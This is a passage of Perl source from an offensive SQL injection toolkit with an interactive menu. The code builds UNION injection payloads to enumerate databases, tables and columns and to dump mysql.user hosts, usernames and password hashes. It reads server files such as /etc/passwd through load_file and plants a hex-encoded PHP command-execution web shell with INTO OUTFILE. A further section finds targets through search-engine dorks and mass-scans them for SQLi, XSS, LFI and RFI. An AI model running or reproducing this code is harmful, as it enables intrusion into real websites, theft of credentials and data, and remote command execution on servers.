        if ( $page =~ /(.*)hackman(.*)/ig ) {
            printear( "[+] Searching information..\n\n", "text", "13", "5" );
            my ( $start, $end ) = ( $1, $2 );
            $inforschema =
                $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
              . $end
              . $pass1 . "from"
              . $pass1
              . "information_schema.tables"
              . $pass2;
            $mysqluser =
                $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
              . $end
              . $pass1 . "from"
              . $pass1
              . "mysql.user"
              . $pass2;
            $test3 =
              toma( $start
                  . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                  . $end
                  . $pass2 );
            $test1 = toma($inforschema);
            $test2 = toma($mysqluser);
            if ( $test2 =~ /ERTOR854/ig ) {
                savefilear( $save . ".txt", "[mysql.user] : ON" );
                printear( "[mysql.user] : ON\n", "text", "7", "5" );
            }
            else {
                printear( "[mysql.user] : OFF\n", "text", "5", "5" );
                savefilear( $save . ".txt", "[mysql.user] : OFF" );
            }
            if ( $test1 =~ /ERTOR854/ig ) {
                printear( "[information_schema.tables] : ON\n",
                    "text", "7", "5" );
                savefilear( $save . ".txt",
                    "[information_schema.tables] : ON" );
            }
            else {
                printear( "[information_schema.tables] : OFF\n",
                    "text", "5", "5" );
                savefilear( $save . ".txt",
                    "[information_schema.tables] : OFF" );
            }
            if ( $test3 =~ /ERTOR854/ig ) {
                printear( "[load_file] : ON\n", "text", "7", "5" );
                savefilear(
                    $save . ".txt",
                    "[load_file] : " 
                      . $start
                      . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                      . $end
                      . $pass2
                );
            }
            $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))";
            $injection = $start . $concat . $end . $pass2;
            $code      = toma($injection);
            if ( $code =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/g ) {
                printear(
"\n[!] DB Version : $1\n[!] DB Name : $2\n[!] Username : $3\n\n",
                    "text", "7", "5"
                );
                savefilear(
                    $save . ".txt",
"\n[!] DB Version : $1\n[!] DB Name : $2\n[!] Username : $3\n"
                );
            }
            else {
                printear( "\n[-] Not found any data\n", "text", "5", "5" );
            }
        }
    }

    sub menu_options {

        my $testarnownow = $_[0];    ## Comment on this line to compile to exe
        $SIG{INT} =
          sub { reload($testarnownow) }; ## Comment on this line to compile to exe

        head_kobra();

        printear( "[Target confirmed] : $_[0]\n", "text", "11", "5" );
        printear( "[Bypass] : $_[1]\n\n",         "text", "11", "5" );

        my $save = partimealmedio( $_[0] );

        printear( "[save] : /logs/webs/$save\n\n", "text", "11", "5" );

        printear( "\n--== information_schema.tables ==--\n\n",
            "text", "5", "5" );
        printear( "[1] : Show tables\n",                  "text", "13", "5" );
        printear( "[2] : Show columns\n",                 "text", "13", "5" );
        printear( "[3] : Show DBS\n",                     "text", "13", "5" );
        printear( "[4] : Show tables with other DB\n",    "text", "13", "5" );
        printear( "[5] : Show columns with other DB",     "text", "13", "5" );
        printear( "\n\n--== mysql.user ==--\n\n",         "text", "5",  "5" );
        printear( "[6] : Show users\n",                   "text", "13", "5" );
        printear( "\n--== Others ==--\n\n",               "text", "5",  "5" );
        printear( "[7] : Fuzz tables\n",                  "text", "13", "5" );
        printear( "[8] : Fuzz Columns\n",                 "text", "13", "5" );
        printear( "[9] : Fuzzing files with load_file\n", "text", "13", "5" );
        printear( "[10] : Read a file with load_file\n",  "text", "13", "5" );
        printear( "[11] : Dump\n",                        "text", "13", "5" );
        printear( "[12] : Informacion of the server\n",   "text", "13", "5" );
        printear( "[13] : Create a shell with into outfile\n",
            "text", "13", "5" );
        printear( "[14] : Show Log\n",      "text", "13", "5" );
        printear( "[15] : Change Target\n", "text", "13", "5" );
        printear( "[16] : Exit\n",          "text", "13", "5" );

        my $opcion = printear( "\n\n[Option] : ", "stdin", "11", "13" );

        if ( $opcion eq "1" ) {
            schematables( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "2" ) {
            my $tabla = printear( "\n\n[Table] : ", "stdin", "11", "13" );
            schemacolumns( $_[0], $_[1], $save, $tabla );
            &reload;
        }
        elsif ( $opcion eq "3" ) {
            &schemadb( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "4" ) {
            my $data = printear( "\n\n[DAtabase] : ", "stdin", "11", "13" );
            &schematablesdb( $_[0], $_[1], $data, $save );
            &reload;
        }
        elsif ( $opcion eq "5" ) {
            my $db    = printear( "\n\n[DB] : ",  "stdin", "11", "13" );
            my $table = printear( "\n[Table] : ", "stdin", "11", "13" );
            &schemacolumnsdb( $_[0], $_[1], $db, $table, $save );
            &reload;
        }
        elsif ( $opcion eq "6" ) {
            &mysqluser( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "7" ) {    ##
            &fuzz( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "8" ) {    ##
            my $table = printear( "\n\n[Table] : ", "stdin", "11", "13" );
            &fuzzcol( $_[0], $_[1], $table, $save );
            &reload;
        }
        elsif ( $opcion eq "9" ) {
            &load( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "10" ) {
            &loadfile( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "11" ) {
            my $tabla =
              printear( "\n\n[Table to dump] : ", "stdin", "11", "13" );
            my $col1 = printear( "\n[Column 1] : ", "stdin", "11", "13" );
            my $col2 = printear( "\n[Column 2] : ", "stdin", "11", "13" );
            print "\n\n";
            &dump( $_[0], $col1, $col2, $tabla, $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "12" ) {
            print "\n\n";
            &details( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "13" ) {
            my $path =
              printear( "\n\n[Full Path Discloure] : ", "stdin", "11", "13" );
            &into( $_[0], $_[1], $path, $save );
            &reload;
        }
        elsif ( $opcion eq "14" ) {
            $t = "logs/webs/$save.txt";
            system("start $t");
            &reload;
        }
        elsif ( $opcion eq "15" ) {
            &head_kobra;
            &menu_kobra;
        }

        elsif ( $opcion eq "16" ) {
            printear( "\n\n[+] Finished\n\n", "text", "13", "5" );
            <stdin>;
            estoydentro();
        }
        else {
            &reload;
        }
    }

    sub schematables {

        $real = "1";
        my ( $page, $bypass, $save ) = @_;
        savefilear( $save . ".txt", "\n" );
        print "\n";
        my $page1 = $page;
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        savefilear( $save . ".txt", "[DB] : default" );
        printear( "\n[+] Searching tables with schema\n\n", "text", "13", "5" );
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code =
          toma( $page1 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.tables"
              . $pass2 );

        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            my $resto = $1;
            $total = $resto - 17;
            printear( "[+] Tables Length :  $total\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[+] Searching tables with schema\n" );
            savefilear( $save . ".txt", "[+] Tables Length :  $total\n" );
            my $limit = $1;
            for my $limit ( 17 .. $limit ) {
                $code1 =
                  toma( $page 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.tables"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."limit".$pass1.$limit.",1".$pass2."\n";
                if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $table = $1;
                    chomp $table;
                    printear( "[Table $real Found : $table ]\n",
                        "text", "7", "5" );
                    savefilear( $save . ".txt",
                        "[Table $real Found : $table ]" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub reload {
        printear( "\n\n[+] Finish\n\n", "text", "11", "5" );
        <STDIN>;
        &head_kobra;
        &menu_options;
    }

    sub schemacolumns {
        my ( $page, $bypass, $save, $table ) = @_;
        my $page3 = $page;
        my $page4 = $page;
        savefilear( $save . ".txt", "\n" );
        print "\n";
        ( $pass1, $pass2 ) = &bypass($bypass);
        printear( "\n[DB] : default\n", "text", "13", "5" );
        savefilear( $save . ".txt", "[DB] : default" );
        savefilear( $save . ".txt", "[Table] : $table\n" );
        $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code3 =
          toma( $page3 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.columns"
              . $pass1 . "where"
              . $pass1
              . "table_name=char("
              . ascii($table) . ")"
              . $pass2 );

        if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            printear( "\n[Columns Length : $1 ]\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[Columns Length : $1 ]\n" );
            my $si = $1;
            chomp $si;
            $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";
            for my $limit2 ( 0 .. $si ) {
                $code4 =
                  toma( $page4 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.columns"
                      . $pass1 . "where"
                      . $pass1
                      . "table_name=char("
                      . ascii($table) . ")"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit2 . ",1"
                      . $pass2 );
                if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    printear( "[Column $real] : $1\n", "text", "7", "5" );
                    savefilear( $save . ".txt", "[Column $real] : $1" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub schemadb {
        my ( $page, $bypass, $save ) = @_;
        my $page1 = $page;
        savefilear( $save . ".txt", "\n" );
        printear( "\n\n[+] Searching DBS\n\n", "text", "13", "5" );
        ( $pass1, $pass2 ) = &bypass($bypass);
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code = toma(
            $page . $pass1 . "from" . $pass1 . "information_schema.schemata" );
        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            my $limita = $1;
            printear( "[+] Databases Length : $limita\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[+] Databases Length : $limita\n" );
            $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";
            for my $limit ( 0 .. $limita ) {
                $code =
                  toma( $page1 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.schemata"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );
                if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $control = $1;
                    if (    $control ne "information_schema"
                        and $control ne "mysql"
                        and $control ne "phpmyadmin" )
                    {
                        printear(
                            "[Database $real Found] $control\n", "text",
                            "7",                                 "5"
                        );
                        savefilear( $save . ".txt",
                            "[Database $real Found] : $control" );
                        $real++;
                    }
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub schematablesdb {
        my $page  = $_[0];
        my $db    = $_[2];
        my $page1 = $page;
        savefilear( $_[3] . ".txt", "\n" );
        printear( "\n\n[+] Searching tables with DB $db\n\n",
            "text", "13", "5" );
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        savefilear( $_[3] . ".txt", "[DB] : $db" );
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code =
          toma( $page1 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.tables"
              . $pass1 . "where"
              . $pass1
              . "table_schema=char("
              . ascii($db) . ")"
              . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass2."\n";
        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            printear( "[+] Tables Length :  $1\n\n", "text", "13", "5" );
            savefilear( $_[3] . ".txt", "[+] Tables Length :  $1\n" );
            my $limit = $1;
            $real = "1";
            for my $lim ( 0 .. $limit ) {
                $code1 =
                  toma( $page 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.tables"
                      . $pass1 . "where"
                      . $pass1
                      . "table_schema=char("
                      . ascii($db) . ")"
                      . $pass1 . "limit"
                      . $pass1
                      . $lim . ",1"
                      . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$lim.",1".$pass2."\n";
                if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $table = $1;
                    chomp $table;
                    savefilear( $_[3] . ".txt",
                        "[Table $real Found : $table ]" );
                    printear( "[Table $real Found : $table ]\n",
                        "text", "7", "5" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub schemacolumnsdb {
        my ( $page, $bypass, $db, $table, $save ) = @_;
        my $page3 = $page;
        my $page4 = $page;
        printear( "\n\n[+] Searching columns in table $table with DB $db\n\n",
            "text", "13", "5" );
        savefilear( $save . ".txt", "\n" );
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        savefilear( $save . ".txt", "\n[DB] : $db" );
        savefilear( $save . ".txt", "[Table] : $table" );
        $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code3 =
          toma( $page3 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.columns"
              . $pass1 . "where"
              . $pass1
              . "table_name=char("
              . ascii($table) . ")"
              . $pass1 . "and"
              . $pass1
              . "table_schema=char("
              . ascii($db) . ")"
              . $pass2 );

        if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            printear( "\n[Columns length : $1 ]\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[Columns length : $1 ]\n" );
            my $si = $1;
            chomp $si;
            $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";
            for my $limit2 ( 0 .. $si ) {
                $code4 =
                  toma( $page4 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.columns"
                      . $pass1 . "where"
                      . $pass1
                      . "table_name=char("
                      . ascii($table) . ")"
                      . $pass1 . "and"
                      . $pass1
                      . "table_schema=char("
                      . ascii($db) . ")"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit2 . ",1"
                      . $pass2 );
                if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    printear( "[Column $real] : $1\n", "text", "7", "5" );
                    savefilear( $save . ".txt", "[Column $real] : $1" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub mysqluser {
        my ( $page, $bypass, $save ) = @_;
        my $cop  = $page;
        my $cop1 = $page;
        savefilear( $save . ".txt", "\n" );
        printear( "\n\n[+] Finding mysql.users\n", "text", "13", "5" );
        ( $pass1, $pass2 ) = &bypass($bypass);
        $page =~ s/hackman/concat(char(82,65,84,83,88,80,68,79,87,78,49))/;
        $code =
          toma( $page . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );

        if ( $code =~ /RATSXPDOWN/ig ) {
            $cop1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $code1 =
              toma( $cop1 . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );
            if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                printear( "\n[+] Users Found : $1\n\n", "text", "13", "5" );
                savefilear( $save . ".txt", "\n[+] Users mysql Found : $1\n" );
                for my $limit ( 0 .. $1 ) {
                    $cop =~
s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))/;
                    $code =
                      toma( $cop 
                          . $pass1 . "from" 
                          . $pass1
                          . "mysql.user"
                          . $pass1 . "limit"
                          . $pass1
                          . $limit . ",1"
                          . $pass2 );
                    if ( $code =~
                        /RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/ig
                      )
                    {
                        printear( "[Host] : $1 [User] : $2 [Password] : $3\n",
                            "text", "7", "5" );
                        savefilear( $save . ".txt",
                            "[Host] : $1 [User] : $2 [Password] : $3" );
                    }
                    else {
                        &reload;
                    }
                }
            }
        }
        else {
            printear( "\n[-] mysql.user = ERROR\n", "text", "5", "5" );
        }
    }

    sub fuzz {
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        my $count = "0";
        savefilear( $_[2] . ".txt", "\n" );
        print "\n";
        if ( $_[0] =~ /(.*)hackman(.*)/g ) {
            my $start = $1;
            my $end   = $2;
            printear( "\n[+] Searching tables.....\n\n", "text", "13", "5" );
            for my $table (@buscar2) {
                chomp $table;
                $concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))";
                $injection =
                    $start 
                  . $concat 
                  . $end 
                  . $pass1 . "from" 
                  . $pass1 
                  . $table
                  . $pass2;
                $code = toma($injection);
                if ( $code =~ /ERTOR854/g ) {
                    $count++;
                    printear( "[Table Found] : $table\n", "text", "7", "5" );
                    savefilear( $_[2] . ".txt", "[Table Found] : $table" );
                }
            }
        }
        if ( $count eq "0" ) {
            printear( "[-] Not found any table\n", "text", "5", "5" );
            &reload;
        }
    }

    sub fuzzcol {
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        my $count = "0";
        savefilear( $_[3] . ".txt", "\n" );
        print "\n";
        if ( $_[0] =~ /(.*)hackman(.*)/ ) {
            my $start = $1;
            my $end   = $2;
            printear( "\n[+] Searching columns for the table $_[2]...\n\n\n",
                "text", "13", "5" );
            savefilear( $_[3] . ".txt", "[Table] : $_[2]" );
            for my $columns (@buscar1) {
                chomp $columns;
                $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$columns,char(69,82,84,79,82,56,53,52))))";
                $code =
                  toma( $start 
                      . $concat 
                      . $end 
                      . $pass1 . "from" 
                      . $pass1
                      . $_[2]
                      . $pass2 );
                if ( $code =~ /ERTOR854/g ) {
                    printear( "[Column Found] : $columns\n", "text", "7", "5" );
                    savefilear( $_[3] . ".txt", "[Column Found] : $columns" );
                }
            }
        }
        if ( $count eq "0" ) {
            printear( "[-] Not found any column\n", "text", "5", "5" );
            &reload;
        }
    }

    sub load {
        savefilear( $_[2] . ".txt", "\n" );
        print "\n";
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        if ( $_[0] =~ /(.*)hackman(.*)/g ) {
            printear(
                "\n[+] Searching files with load_file...\n\n\n", "text",
                "13",                                            "5"
            );
            my $start = $1;
            my $end   = $2;
            for my $file (@files) {
                chomp $file;
                $concat =
                    "unhex(hex(concat(char(107,48,98,114,97),load_file("
                  . encode($file)
                  . "),char(107,48,98,114,97))))";
                my $code = toma( $start . $concat . $end . $pass2 );
                chomp $code;
                if ( $code =~ /k0bra(.*)k0bra/s ) {
                    printear( "[File Found] : $file\n", "text", "11", "5" );
                    printear( "\n[Source Start]\n\n",   "text", "7",  "5" );
                    printear( "$1",                     "text", "7",  "5" );
                    printear( "\n\n[Source End]\n\n",   "text", "7",  "5" );
                    savefilear( $_[2] . ".txt", "[File Found] : $file" );
                    savefilear( $_[2] . ".txt", "\n[Source Start]\n" );
                    savefilear( $_[2] . ".txt", "$1" );
                    savefilear( $_[2] . ".txt", "\n[Source End]\n" );
                }
            }
        }
    }

    sub loadfile {
        savefilear( $_[2] . ".txt", "\n" );
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        if ( $_[0] =~ /(.*)hackman(.*)/g ) {
            my $start = $1;
            my $end   = $2;
            my $file =
              printear( "\n\n[+] File to read : ", "stdin", "11", "13" );
            $concat =
                "unhex(hex(concat(char(107,48,98,114,97),load_file("
              . encode($file)
              . "),char(107,48,98,114,97))))";
            my $code = toma( $start . $concat . $end . $pass2 );
            chomp $code;
            if ( $code =~ /k0bra(.*)k0bra/s ) {
                printear( "\n[File Found] : $file\n", "text", "11", "5" );
                printear( "\n[Source Start]\n\n",     "text", "7",  "5" );
                printear( "$1",                       "text", "7",  "5" );
                printear( "\n\n[Source End]\n\n",     "text", "7",  "5" );
                savefilear( $_[2] . ".txt", "[File Found] : $file" );
                savefilear( $_[2] . ".txt", "\n[Source Start]\n" );
                savefilear( $_[2] . ".txt", "$1" );
                savefilear( $_[2] . ".txt", "\n[Source End]\n" );
            }
        }
    }

    sub dump {
        savefilear( $_[5] . ".txt", "\n" );
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[4] );
        if ( $page =~ /(.*)hackman(.*)/ ) {
            my $start = $1;
            my $end   = $2;
            printear( "[+] Extracting values...\n\n", "text", "13", "5" );
            $concatx =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),count($_[1]),char(69,82,84,79,82,56,53,52))))";
            $val_code =
              toma( $start 
                  . $concatx 
                  . $end 
                  . $pass1 . "from" 
                  . $pass1
                  . $_[3]
                  . $pass2 );
            $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$_[1],char(69,82,84,79,82,56,53,52),$_[2],char(69,82,84,79,82,56,53,52))))";
            if ( $val_code =~ /ERTOR854(.*)ERTOR854/ig ) {
                $tota = $1;
                printear( "[+] Length of the rows : $tota\n\n",
                    "text", "13", "5" );
                printear( "[+] Extracting values...\n\n", "text", "13", "5" );
                printear( "[$_[1]] [$_[2]]\n\n",          "text", "13", "5" );
                savefilear( $_[5] . ".txt", "[Table] : $_[3]" );
                savefilear( $_[5] . ".txt", "[+] Length of the rows: $tota\n" );
                savefilear( $_[5] . ".txt", "[$_[1]] [$_[2]]\n" );
                for my $limit ( 0 .. $tota ) {
                    chomp $limit;
                    $injection =
                      toma( $start 
                          . $concat 
                          . $end 
                          . $pass1 . "from" 
                          . $pass1
                          . $_[3]
                          . $pass1 . "limit"
                          . $pass1
                          . $limit . ",1"
                          . $pass2 );
                    if ( $injection =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854/ig ) {
                        savefilear( $_[5] . ".txt",
                            "[$_[1]] : $1   [$_[2]] : $2" );
                        printear(
                            "[$_[1]] : $1   [$_[2]] : $2\n", "text",
                            "7",                             "5"
                        );
                    }
                    else {
                        printear(
                            "\n\n[+] Extracting Finish\n", "text",
                            "13",                          "5"
                        );
                        &reload;
                    }
                }
            }
            else {
                printear( "[-] Not Found any DATA\n\n", "text", "5", "5" );
            }
        }
    }

    sub into {
        printear( "\n\n[Status] : Injecting a SQLI for create a shell\n",
            "text", "13", "5" );
        my ( $page, $bypass, $dir, $save ) = @_;
        savefilear( $save . ".txt", "\n" );
        print "\n";
        ( $pass1, $pass2 ) = &bypass($bypass);
        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);
        if ( $path =~ /\/(.*)$/ ) {
            my $path1 = $1;
            my $path2 = $path1;
            $path2 =~ s/$1//;
            $dir   =~ s/$path1//ig;
            $shell = $dir . "/" . "shell.php";
            if ( $page =~ /(.*)hackman(.*)/ig ) {
                my ( $start, $end ) = ( $1, $2 );
                $code =
                  toma( $start
                      . "0x3c7469746c653e4d696e69205368656c6c20427920446f6464793c2f7469746c653e3c3f7068702069662028697373657428245f4745545b27636d64275d2929207b2073797374656d28245f4745545b27636d64275d293b7d3f3e"
                      . $end
                      . $pass1 . "into"
                      . $pass1
                      . "outfile"
                      . $pass1 . "'"
                      . $shell . "'"
                      . $pass2 );
                $code1 =
                  toma( "http://" . $auth . "/" . $path2 . "/" . "shell.php" );
                if ( $code1 =~ /Mini Shell By Doddy/ig ) {
                    printear(
                        "[Shell Up] : http://" 
                          . $auth . "/" 
                          . $path2 . "/"
                          . "shell.php" . "\a\a",
                        "text", "7", "5"
                    );
                    savefilear(
                        $save . ".txt",
                        "[shell up] : http://" 
                          . $auth . "/" 
                          . $path2 . "/"
                          . "shell.php"
                    );
                }
                else {
                    printear( "[Shell] : Not Found", "text", "5", "5" );
                }
            }
        }
    }

}    ##

sub load_paranoic_old {

    installer_par();
    staq();

    sub staq {

        sub head_scan {
            clean();
            printear( "


  @@@    @@@@    @    @    @  @    @  @@@@@  @@@@@ 
 @   @  @    @   @    @@   @  @@   @  @      @    @
 @      @       @ @   @@   @  @@   @  @      @    @
 @      @       @ @   @ @  @  @ @  @  @      @    @
  @@@   @      @   @  @ @  @  @ @  @  @@@@   @@@@@ 
     @  @      @   @  @  @ @  @  @ @  @      @    @
     @  @      @@@@@  @   @@  @   @@  @      @    @
 @   @  @    @@     @ @   @@  @   @@  @      @    @
  @@@    @@@@ @     @ @    @  @    @  @@@@@  @    @




", "text", "7", "5" );
        }

        &menu_sca;

        sub menu_sca {
            &head_scan;
            printear( "[a] : Scan a File\n", "text", "13", "5" );
            printear(
                "[b] : Search in Google and scan the webs\n", "text",
                "13",                                         "5"
            );
            printear(
                "[c] : Search in Bing and scan the webs\n\n", "text",
                "13",                                         "5"
            );
            my $op = printear( "[option] : ", "stdin", "11", "13" );

            scan($op);

        }

        sub scan {

            my $count;
            my $option;
            my $op = shift;
            my @paginas;

            if ( $op =~ /a/ig ) {

                my $word = printear( "\n[+] Wordlist : ", "stdin", "11", "13" );

                @paginas = repes( cortar( savewords($word) ) );

                $option = &men;

                if ( $option =~ /Q/ig ) {
                    $count =
                      printear( "\n[+] Panels Count : ", "stdin", "11", "13" );
                }

            }

            elsif ( $op =~ /b/ig ) {

                my $dork = printear( "\n[+] Dork : ",  "stdin", "11", "13" );
                my $pag  = printear( "\n[+] Pages : ", "stdin", "11", "13" );
                $option = &men;

                if ( $option =~ /Q/ig ) {
                    $count =
                      printear( "\n[+] Panels Count : ", "stdin", "11", "13" );
                }

                printear( "\n\n[+] Searching in Google\n", "text", "13", "5" );

                @paginas = &google( $dork, $pag );

            }

            elsif ( $op =~ /c/ig ) {
                my $dork = printear( "\n[+] Dork : ",  "stdin", "11", "13" );
                my $pag  = printear( "\n[+] Pages : ", "stdin", "11", "13" );
                $option = &men;

                if ( $option =~ /Q/ig ) {
                    $count =
                      printear( "\n[+] Panels Count : ", "stdin", "11", "13" );
                }

                printear( "\n\n[+] Searching in Bing\n", "text", "13", "5" );

                @paginas = &bing( $dork, $pag );

            }

            else {
                &finish_now;
            }

            printear( "\n\n[Status] : Scanning\n", "text", "7", "5" );
            printear(
                "[Webs Count] : " . int(@paginas) . "\n\n", "text",
                "7",                                        "5"
            );
            for (@paginas) {
                if ( $option =~ /S/ig ) {
                    scansql($_);
                }
                if ( $option =~ /K/ig ) {
                    sql($_);
                }
                if ( $option =~ /Q/ig ) {
                    sqladmin( $_, $count );
                }
                if ( $option =~ /Y/ig ) {
                    simple($_);
                }
                if ( $option =~ /L/ig ) {
                    lfi($_);
                }
                if ( $option =~ /R/ig ) {
                    rfi($_);
                }
                if ( $option =~ /F/ig ) {
                    fsd($_);
                }
                if ( $option =~ /X/ig ) {
                    scanxss($_);
                }
                if ( $option =~ /M/ig ) {
                    mssql($_);
                }
                if ( $option =~ /J/ig ) {
                    access($_);
                }
                if ( $option =~ /O/ig ) {
                    oracle($_);
                }
                if ( $option =~ /HT/ig ) {
                    http($_);
                }
                if ( $option =~ /A/ig ) {
                    scansql($_);
                    scanxss($_);
                    mssql($_);
                    access($_);
                    oracle($_);
                    lfi($_);
                    rfi($_);
                    fsd($_);
                    http($_);
                }
            }
        }
        printear( "\n\n[Status] : Finish\n", "text", "13", "5" );
        &finish_now;
    }

    sub sql {
        my ( $pass1, $pass2 ) = ( "+", "--" );
        my $page = shift;
        $code1 =
          toma( $page . "-1" 
              . $pass1 . "union" 
              . $pass1 
              . "select" 
              . $pass1 . "666"
              . $pass2 );
        if ( $code1 =~
            /The used SELECT statements have a different number of columns/ig )
        {
            printear( "[+] SQLI : $page\a\n", "text", "11", "5" );
            savefile( "sql-logs.txt", $page );
        }
    }

    sub sqladmin {

        my ( $pass1, $pass2 ) = ( "+", "--" );

        my $page   = $_[0];
        my $limite = $_[1];

        if ( $limite eq "" ) {
            $limite = 3;
        }

        $code1 =
          toma( $page . "-1" 
              . $pass1 . "union" 
              . $pass1 
              . "select" 
              . $pass1 . "666"
              . $pass2 );
        if ( $code1 =~
            /The used SELECT statements have a different number of columns/ig )
        {
            printear( "\n[+] SQLI : $page\a\n", "text", "11", "5" );
            savefile( "sql-logs.txt", $page );

            my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);

            my $fage = "http://" . $auth;

            my $count = 0;

            for my $path (@paneles) {

                if ( $count eq $limite ) {
                    last;
                }

                $code = tomados( $fage . "/" . $path );

                if ( $code->is_success ) {
